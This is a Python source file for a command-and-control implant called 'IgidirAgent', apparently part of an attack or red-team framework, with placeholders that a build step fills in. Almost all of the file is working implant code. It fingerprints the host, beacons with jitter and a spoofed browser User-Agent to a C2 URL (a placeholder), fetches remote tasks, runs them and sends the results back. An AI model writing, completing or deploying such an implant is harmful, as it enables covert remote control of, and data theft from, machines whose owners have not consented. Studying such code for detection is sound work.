#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import os
import platform
import random
import socket
import sys
import time
import uuid
from datetime import datetime
import threading
import traceback
import urllib.parse
import requests
import ssl
import netifaces
import logging
from typing import Dict, List, Any, Optional, Union, Tuple

# Import encryption module (will be replaced during build)
#{ENCRYPTION_MODULE}#

# Import commands module (will be replaced during build)
#{COMMANDS_MODULE}#

# Configuration will be inserted at build time
AGENT_CONFIG = json.loads("""#{AGENT_CONFIG}#""")

class IgidirAgent:
    def __init__(self):
        # Basic agent settings
        self.uuid = str(uuid.uuid4())
        self.hostname = socket.gethostname()
        self.username = self._get_username()
        self.platform = platform.system()
        self.architecture = platform.machine()
        self.pid = os.getpid()
        self.ppid = os.getppid() if hasattr(os, 'getppid') else 0
        self.debug = AGENT_CONFIG.get("debug", False)
        self.callback_interval = AGENT_CONFIG.get("callback_interval", 5)
        self.kill_date = AGENT_CONFIG.get("kill_date", "")
        
        # Set up encryption if enabled
        self.use_encryption = AGENT_CONFIG.get("use_encryption", True)
        if self.use_encryption:
            self.encryption = EncryptionModule()
        
        # Set up command handler
        self.command_handler = CommandHandler(self)
        
        # C2 communication settings
        self.server_url = None
        self.http_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
        }
        
        # Setup logging if debug is enabled
        if self.debug:
            logging.basicConfig(
                level=logging.DEBUG,
                format="%(asctime)s - [%(levelname)s] - %(message)s",
                handlers=[logging.StreamHandler()]
            )
        else:
            logging.basicConfig(level=logging.ERROR)
        
        # Internal state
        self.tasks = {}
        self.running = True
        self.jitter = random.uniform(0, 0.5)  # Add some randomness to callback times
        
        # Network interfaces information
        self.interfaces = self._get_interfaces()
        
        self.log("Agent initialized successfully")
    
    def _get_username(self) -> str:
        """Get the current user's username"""
        try:
            if platform.system() == "Windows":
                return os.environ.get("USERNAME", "unknown")
            else:
                return os.environ.get("USER", "unknown")
        except:
            return "unknown"
            
    def _get_interfaces(self) -> List[Dict[str, Any]]:
        """Get network interfaces information"""
        interfaces = []
        try:
            for interface in netifaces.interfaces():
                addresses = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addresses:
                    for address in addresses[netifaces.AF_INET]:
                        interfaces.append({
                            "name": interface,
                            "ip": address.get("addr", ""),
                            "netmask": address.get("netmask", "")
                        })
        except Exception as e:
            self.log(f"Error getting network interfaces: {str(e)}", level="error")
        return interfaces
    
    def log(self, message: str, level: str = "info") -> None:
        """Log a message if debug is enabled"""
        if self.debug:
            if level == "error":
                logging.error(message)
            elif level == "warning":
                logging.warning(message)
            else:
                logging.info(message)
    
    def check_kill_date(self) -> bool:
        """Check if the kill date has passed"""
        if not self.kill_date:
            return False
        
        try:
            kill_date = datetime.strptime(self.kill_date, "%Y-%m-%d")
            return datetime.now() > kill_date
        except Exception:
            return False
    
    def checkin(self) -> Dict[str, Any]:
        """Generate the initial checkin data"""
        checkin_data = {
            "action": "checkin",
            "ip": self._get_public_ip(),
            "os": self.platform,
            "user": self.username,
            "host": self.hostname,
            "pid": self.pid,
            "uuid": self.uuid,
            "architecture": self.architecture,
            "domain": socket.getfqdn(),
            "process_name": sys.executable,
            "interfaces": self.interfaces
        }
        
        self.log(f"Checkin data: {checkin_data}")
        return checkin_data
    
    def _get_public_ip(self) -> str:
        """Get the public IP address"""
        try:
            response = requests.get("https://api.ipify.org", timeout=3)
            if response.status_code == 200:
                return response.text
        except Exception:
            pass
        
        # Fallback to local IP if public IP can't be determined
        for interface in self.interfaces:
            if interface["ip"] and not interface["ip"].startswith("127."):
                return interface["ip"]
        
        return "unknown"
    
    def encrypt_data(self, data: Union[Dict, str]) -> str:
        """Encrypt data before sending to C2"""
        if isinstance(data, dict):
            data = json.dumps(data)
        
        if self.use_encryption:
            return self.encryption.encrypt(data)
        else:
            return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, data: str) -> Dict:
        """Decrypt data received from C2"""
        try:
            if self.use_encryption:
                decrypted = self.encryption.decrypt(data)
            else:
                decrypted = base64.b64decode(data.encode()).decode()
            
            return json.loads(decrypted)
        except Exception as e:
            self.log(f"Error decrypting data: {str(e)}", level="error")
            return {}
    
    def send_response(self, task_id: str, status: str, output: str = "") -> None:
        """Send a response for a task back to the C2"""
        try:
            response_data = {
                "action": "response",
                "task_id": task_id,
                "status": status,
                "output": output
            }
            
            self.log(f"Sending response for task {task_id}: {status}")
            
            encrypted_data = self.encrypt_data(response_data)
            response = self._send_to_c2(encrypted_data)
            
            if response and response.get("status") == "success":
                self.log(f"Response for task {task_id} sent successfully")
            else:
                self.log(f"Failed to send response for task {task_id}", level="error")
                
        except Exception as e:
            self.log(f"Error sending response: {str(e)}", level="error")
    
    def _send_to_c2(self, data: str) -> Dict:
        """Send data to the C2 server"""
        try:
            if not self.server_url:
                self.log("No C2 server URL configured", level="error")
                return {"status": "error", "message": "No C2 server URL configured"}
            
            response = requests.post(
                self.server_url,
                headers=self.http_headers,
                data=data,
                verify=False,  # In a real agent, you might want to verify SSL certs
                timeout=10
            )
            
            if response.status_code == 200:
                try:
                    return self.decrypt_data(response.text)
                except:
                    return {"status": "error", "message": "Failed to decrypt response"}
            else:
                self.log(f"C2 server returned status code {response.status_code}", level="error")
                return {"status": "error", "message": f"C2 server returned status code {response.status_code}"}
                
        except requests.exceptions.RequestException as e:
            self.log(f"Error sending data to C2: {str(e)}", level="error")
            return {"status": "error", "message": str(e)}
    
    def get_tasks(self) -> List[Dict]:
        """Get tasks from the C2 server"""
        try:
            request_data = {
                "action": "get_tasks",
                "uuid": self.uuid
            }
            
            encrypted_data = self.encrypt_data(request_data)
            response = self._send_to_c2(encrypted_data)
            
            if response.get("status") == "success" and "tasks" in response:
                return response["tasks"]
            else:
                return []
                
        except Exception as e:
            self.log(f"Error getting tasks: {str(e)}", level="error")
            return []
    
    def process_tasks(self, tasks: List[Dict]) -> None:
        """Process tasks received from the C2 server"""
        for task in tasks:
            try:
                task_id = task.get("id")
                command = task.get("command")
                parameters = task.get("parameters", {})
                
                if not task_id or not command:
                    continue
                
                self.log(f"Processing task {task_id}: {command}")
                
                # Execute the command
                result = self.command_handler.execute_command(command, parameters)
                
                # Send the response back to the C2
                self.send_response(task_id, "completed", result)
                
            except Exception as e:
                self.log(f"Error processing task: {str(e)}", level="error")
                if task_id:
                    self.send_response(task_id, "error", str(e))
    
    def run(self, server_url: str) -> None:
        """Main agent loop"""
        self.server_url = server_url
        
        # Initial checkin
        try:
            checkin_data = self.checkin()
            encrypted_data = self.encrypt_data(checkin_data)
            response = self._send_to_c2(encrypted_data)
            
            if not response or response.get("status") != "success":
                self.log("Initial checkin failed", level="error")
                return
                
            self.log("Initial checkin successful")
            
        except Exception as e:
            self.log(f"Error during initial checkin: {str(e)}", level="error")
            return
        
        # Main loop
        while self.running:
            try:
                # Check if kill date has passed
                if self.check_kill_date():
                    self.log("Kill date reached, exiting")
                    self.running = False
                    break
                
                # Get tasks from C2
                tasks = self.get_tasks()
                if tasks:
                    self.process_tasks(tasks)
                
                # Sleep before next check, with jitter
                sleep_time = self.callback_interval + (self.callback_interval * self.jitter)
                time.sleep(sleep_time)
                
            except Exception as e:
                self.log(f"Error in main loop: {str(e)}", level="error")
                time.sleep(self.callback_interval)
                
        self.log("Agent shutting down")


def main():
    # In a real agent, you would have the actual C2 URL here
    # For demo purposes, we'll use a placeholder
    C2_SERVER_URL = "https://example.com/api/callback"
    
    agent = IgidirAgent()
    agent.run(C2_SERVER_URL)


if __name__ == "__main__":
    main()